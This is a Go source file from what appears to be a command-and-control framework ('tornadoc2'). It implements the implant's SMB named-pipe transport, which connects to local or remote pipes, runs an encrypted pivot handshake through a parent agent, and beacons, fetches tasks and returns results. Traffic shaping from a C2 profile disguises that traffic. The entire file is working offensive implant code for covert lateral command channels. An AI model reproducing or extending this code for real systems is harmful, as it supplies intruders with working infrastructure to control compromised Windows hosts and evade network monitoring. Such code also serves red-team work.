//go:build windows

package transport

import (
	"bufio"
	"crypto/ecdsa"
	"encoding/binary"
	"encoding/json"
	"errors"
	"fmt"
	"io"
	"strings"
	"sync"
	"time"

	"golang.org/x/sys/windows"
	"tornadoc2/agent/crypto"
	"tornadoc2/agent/features"
	"tornadoc2/agent/internal/pivot"
	"tornadoc2/agent/protocol"
)

type smbTransport struct {
	pipeName string
	agentPriv *ecdsa.PrivateKey
	pivotPub  *ecdsa.PublicKey
	fp        string

	// shaping is the C2 profile's shaping spec, embedded at
	// build time from the same --c2-profile the parent was
	// built against. The child decrypts the wire envelope
	// with its own wire session, then unwraps the shape with
	// this spec. The parent cannot do either step on the
	// child's behalf: the wire session key belongs to the
	// child, not to the parent. Nil when the build embedded
	// no shaping block.
	shaping *features.ShapingSpec

	mu        sync.Mutex
	conn      windows.Handle
	rd        *bufio.Reader
	pivotSess *pivot.Session
}

func NewSMBTransport(pipeName string,
	agentPriv *ecdsa.PrivateKey,
	pivotPub *ecdsa.PublicKey,
	identity protocol.Identity,
	shaping *features.ShapingSpec) (*smbTransport, error) {

	if pipeName == "" {
		return nil, errors.New(
			"smb transport: pipe name is empty")
	}
	if agentPriv == nil {
		return nil, errors.New(
			"smb transport: agent identity key is missing")
	}
	if pivotPub == nil {
		return nil, errors.New(
			"smb transport: pivot public key is missing")
	}
	normalized, err := normalizeChildPipeName(pipeName)
	if err != nil {
		return nil, err
	}

	fp := identity.Fingerprint()
	if fp == "" {
		return nil, errors.New(
			"smb transport: identity produced an empty " +
				"fingerprint")
	}
	return &smbTransport{
		pipeName:  normalized,
		conn:      windows.InvalidHandle,
		agentPriv: agentPriv,
		pivotPub:  pivotPub,
		fp:        fp,
		shaping:   shaping,
	}, nil
}

// normalizeChildPipeName accepts three forms and produces the
// exact string CreateFile should receive:
//
//   - bare name ("tornado_relay_001")
//       → "\\.\pipe\tornado_relay_001"  (local pipe)
//
//   - local path ("\\.\pipe\tornado_relay_001")
//       → unchanged
//
//   - UNC path ("\\WIN-SRV2\pipe\tornado_relay_001")
//       → unchanged  (remote pipe over SMB)
//
// A UNC path without the "\pipe\" segment is rejected because the
// resulting CreateFile call would fail with ERROR_BAD_PATHNAME
// and the error would be indistinguishable from a typo'd hostname.
func normalizeChildPipeName(name string) (string, error) {
	if name == "" {
		return "", errors.New("smb transport: pipe name is empty")
	}
	// Local pipe path — already correct.
	if strings.HasPrefix(name, `\\.\pipe\`) {
		return name, nil
	}
	// UNC path to a remote host.
	if strings.HasPrefix(name, `\\`) {
		if !strings.Contains(name, `\pipe\`) {
			return "", fmt.Errorf(
				"smb transport: %q looks like a UNC path "+
					"but is missing the \\pipe\\ segment; "+
					"expected \\\\HOST\\pipe\\NAME", name)
		}
		return name, nil
	}
	// Bare name — make it a local pipe.
	return `\\.\pipe\` + name, nil
}

func (t *smbTransport) Name() string { return "smb" }

func (t *smbTransport) dial() error {
	if t.conn != windows.InvalidHandle {
		return nil
	}
	p, err := windows.UTF16PtrFromString(t.pipeName)
	if err != nil {
		return err
	}
	h, err := windows.CreateFile(
		p,
		windows.GENERIC_READ|windows.GENERIC_WRITE,
		0, nil, windows.OPEN_EXISTING,
		windows.FILE_FLAG_OVERLAPPED, 0,
	)
	if err != nil {
		return fmt.Errorf("CreateFile %s: %w", t.pipeName, err)
	}
	t.conn = h
	return nil
}

func (t *smbTransport) close() {
	if t.conn != windows.InvalidHandle {
		windows.CloseHandle(t.conn)
		t.conn = windows.InvalidHandle
	}
	if t.pivotSess != nil {
		t.pivotSess.Close()
		t.pivotSess = nil
	}
}

const pipeDeadline = 30 * time.Second

func overlappedRead(h windows.Handle, p []byte) (int, error) {
	ev, err := windows.CreateEvent(nil, 0, 0, nil)
	if err != nil {
		return 0, err
	}
	defer windows.CloseHandle(ev)

	var ov windows.Overlapped
	ov.HEvent = ev

	var n uint32
	err = windows.ReadFile(h, p, &n, &ov)
	if err == windows.ERROR_IO_PENDING {
		waitMS := uint32(pipeDeadline / time.Millisecond)
		w, werr := windows.WaitForSingleObject(ev, waitMS)
		if werr != nil {
			windows.CancelIoEx(h, &ov)
			return 0, werr
		}
		if w == uint32(windows.WAIT_TIMEOUT) {
			windows.CancelIoEx(h, &ov)
			return 0, fmt.Errorf("pipe read: timeout after %v",
				pipeDeadline)
		}
		err = windows.GetOverlappedResult(h, &ov, &n, false)
	}
	if err != nil {
		if err == windows.ERROR_BROKEN_PIPE ||
			err == windows.ERROR_HANDLE_EOF ||
			err == windows.ERROR_OPERATION_ABORTED {
			if n == 0 {
				return 0, io.EOF
			}
			return int(n), nil
		}
		return int(n), err
	}
	if n == 0 {
		return 0, io.EOF
	}
	return int(n), nil
}

func overlappedWrite(h windows.Handle, buf []byte) error {
	for len(buf) > 0 {
		ev, err := windows.CreateEvent(nil, 0, 0, nil)
		if err != nil {
			return err
		}
		var ov windows.Overlapped
		ov.HEvent = ev

		var n uint32
		err = windows.WriteFile(h, buf, &n, &ov)
		if err == windows.ERROR_IO_PENDING {
			waitMS := uint32(pipeDeadline / time.Millisecond)
			w, werr := windows.WaitForSingleObject(ev, waitMS)
			if werr != nil {
				windows.CancelIoEx(h, &ov)
				windows.CloseHandle(ev)
				return werr
			}
			if w == uint32(windows.WAIT_TIMEOUT) {
				windows.CancelIoEx(h, &ov)
				windows.CloseHandle(ev)
				return fmt.Errorf(
					"pipe write: timeout after %v",
					pipeDeadline)
			}
			err = windows.GetOverlappedResult(h, &ov, &n, false)
		}
		windows.CloseHandle(ev)
		if err != nil {
			return err
		}
		if n == 0 {
			return errors.New(
				"smb: pipe write returned 0 bytes")
		}
		buf = buf[n:]
	}
	return nil
}

type pipeFrameIO struct {
	h windows.Handle
}

func (f *pipeFrameIO) WriteFrame(body []byte) error {
	var lenBuf [4]byte
	binary.BigEndian.PutUint32(lenBuf[:], uint32(len(body)))
	if err := overlappedWrite(f.h, lenBuf[:]); err != nil {
		return err
	}
	return overlappedWrite(f.h, body)
}

func (f *pipeFrameIO) ReadFrame() ([]byte, error) {
	var lenBuf [4]byte
	if err := readFullOverlapped(f.h, lenBuf[:]); err != nil {
		return nil, err
	}
	n := binary.BigEndian.Uint32(lenBuf[:])
	if n == 0 || n > 16*1024*1024 {
		return nil, fmt.Errorf("invalid frame length %d", n)
	}
	buf := make([]byte, n)
	if err := readFullOverlapped(f.h, buf); err != nil {
		return nil, err
	}
	return buf, nil
}

func readFullOverlapped(h windows.Handle, buf []byte) error {
	off := 0
	for off < len(buf) {
		n, err := overlappedRead(h, buf[off:])
		off += n
		if err != nil {
			if err == io.EOF && off == len(buf) {
				return nil
			}
			return err
		}
	}
	return nil
}

func (t *smbTransport) roundTrip(req []byte) ([]byte, error) {
	t.mu.Lock()
	defer t.mu.Unlock()

	for attempt := 0; attempt < 2; attempt++ {
		if err := t.dial(); err != nil {
			t.close()
			return nil, err
		}
		fio := &pipeFrameIO{h: t.conn}

		if t.pivotSess == nil {
			sess, err := pivot.ClientHandshake(
				fio, t.agentPriv, t.pivotPub, t.fp)
			if err != nil {
				t.close()
				continue
			}
			t.pivotSess = sess
		}

		frame, err := t.pivotSess.EncryptChildToParent(req)
		if err != nil {
			t.close()
			continue
		}
		frameBytes, err := pivot.EncodeFrame(frame)
		if err != nil {
			t.close()
			return nil, err
		}
		if err := fio.WriteFrame(frameBytes); err != nil {
			t.close()
			continue
		}
		respBytes, err := fio.ReadFrame()
		if err != nil {
			t.close()
			continue
		}
		respFrame, err := pivot.DecodeFrame(respBytes)
		if err != nil {
			t.close()
			return nil, err
		}
		plaintext, err := t.pivotSess.DecryptParentToChild(respFrame)
		if err != nil {
			t.close()
			return nil, err
		}
		return plaintext, nil
	}
	return nil, errors.New("smb: pipe failed after reconnect")
}

func (t *smbTransport) CheckIn(identity Identity,
	pubkeyPEM, identitySig string, identityTs int64,
	wire *WireSession) (*CheckinResponse, error) {

	payload := CheckinRequest{Identity: identity}
	if pubkeyPEM != "" {
		payload.AgentPubKey = pubkeyPEM
	}
	if identitySig != "" {
		payload.IdentitySig = identitySig
		payload.IdentityTs = identityTs
	}
	body, err := json.Marshal(payload)
	if err != nil {
		return nil, err
	}
	if wire != nil {
		body, err = wire.EncryptRequest(body)
		if err != nil {
			return nil, err
		}
	}
	req := map[string]interface{}{
		"op":   "beacon",
		"body": json.RawMessage(body),
	}
	reqBytes, err := json.Marshal(req)
	if err != nil {
		return nil, err
	}
	respBytes, err := t.roundTrip(reqBytes)
	if err != nil {
		return nil, err
	}
	var env struct {
		Body   json.RawMessage `json:"body"`
		Err    string          `json:"error"`
		Status int             `json:"status"`
	}
	if err := json.Unmarshal(respBytes, &env); err != nil {
		return nil, fmt.Errorf("smb: bad reply: %w", err)
	}
	if env.Status != 0 {
		return nil, fmt.Errorf("smb: status %d: %s",
			env.Status, env.Err)
	}
	if env.Err != "" {
		return nil, errors.New("smb: " + env.Err)
	}
	respBody := []byte(env.Body)

	// Order matters and matches the HTTP and TCP transports:
	//   1. decrypt the wire envelope (the server encrypts the
	//      whole shaped body, not the inner payload)
	//   2. unwrap the shaping template (extracts the plaintext
	//      from the shaped JSON)
	//   3. unmarshal as CheckinResponse
	//
	// The parent forwards both bodies verbatim. The wire
	// session key is the child's, so only the child can do
	// step 1; and once step 1 has run, the shaped body is
	// visible for step 2.
	if wire != nil {
		plain, wasEnc, derr := wire.DecryptResponse(respBody)
		if derr != nil {
			return nil, fmt.Errorf("decrypt: %w", derr)
		}
		if wasEnc {
			respBody = plain
		}
	}
	if t.shaping != nil && t.shaping.CheckinResponse != nil {
		u, serr := features.ShapeUnwrap(
			respBody, t.shaping.CheckinResponse)
		if serr != nil {
			return nil, fmt.Errorf(
				"smb: checkin shape: %w", serr)
		}
		respBody = u
	}
	var out CheckinResponse
	if err := json.Unmarshal(respBody, &out); err != nil {
		return nil, err
	}
	return &out, nil
}

func (t *smbTransport) FetchTasks(wire *WireSession) ([]Task, error) {
	req := map[string]interface{}{"op": "tasks"}
	reqBytes, err := json.Marshal(req)
	if err != nil {
		return nil, err
	}
	respBytes, err := t.roundTrip(reqBytes)
	if err != nil {
		return nil, err
	}
	var env struct {
		Body   json.RawMessage `json:"body"`
		Err    string          `json:"error"`
		Status int             `json:"status"`
	}
	if err := json.Unmarshal(respBytes, &env); err != nil {
		return nil, fmt.Errorf("smb: bad reply: %w", err)
	}
	if env.Status != 0 {
		return nil, fmt.Errorf("smb: status %d: %s",
			env.Status, env.Err)
	}
	if env.Err != "" {
		return nil, errors.New("smb: " + env.Err)
	}
	body := []byte(env.Body)

	if wire != nil && crypto.IsEnvelope(body) {
		plain, wasEnc, derr := wire.DecryptResponse(body)
		if derr != nil {
			return nil, fmt.Errorf("decrypt: %w", derr)
		}
		if wasEnc {
			body = plain
		}
	}
	if t.shaping != nil && t.shaping.TasksResponse != nil {
		u, serr := features.ShapeUnwrap(
			body, t.shaping.TasksResponse)
		if serr != nil {
			return nil, fmt.Errorf(
				"smb: tasks shape: %w", serr)
		}
		body = u
	}
	var tasks []Task
	if err := json.Unmarshal(body, &tasks); err != nil {
		return nil, err
	}
	return tasks, nil
}

func (t *smbTransport) PostResult(r Result, wire *WireSession) error {
	body, err := json.Marshal(r)
	if err != nil {
		return err
	}
	if t.shaping != nil && t.shaping.ResultsRequest != nil {
		body, err = features.ShapeWrap(
			t.shaping.ResultsRequest, r)
		if err != nil {
			return err
		}
	}
	if wire != nil {
		body, err = wire.EncryptRequest(body)
		if err != nil {
			return err
		}
	}
	req := map[string]interface{}{
		"op":   "results",
		"body": json.RawMessage(body),
	}
	reqBytes, err := json.Marshal(req)
	if err != nil {
		return err
	}
	respBytes, err := t.roundTrip(reqBytes)
	if err != nil {
		return err
	}
	var env struct {
		Err    string `json:"error"`
		Status int    `json:"status"`
	}
	if err := json.Unmarshal(respBytes, &env); err != nil {
		return fmt.Errorf("smb: bad reply: %w", err)
	}
	if env.Status != 0 {
		return fmt.Errorf("smb: status %d: %s",
			env.Status, env.Err)
	}
	if env.Err != "" {
		return errors.New("smb: " + env.Err)
	}
	return nil
}

func (t *smbTransport) Close() error {
	t.mu.Lock()
	defer t.mu.Unlock()
	t.close()
	return nil
}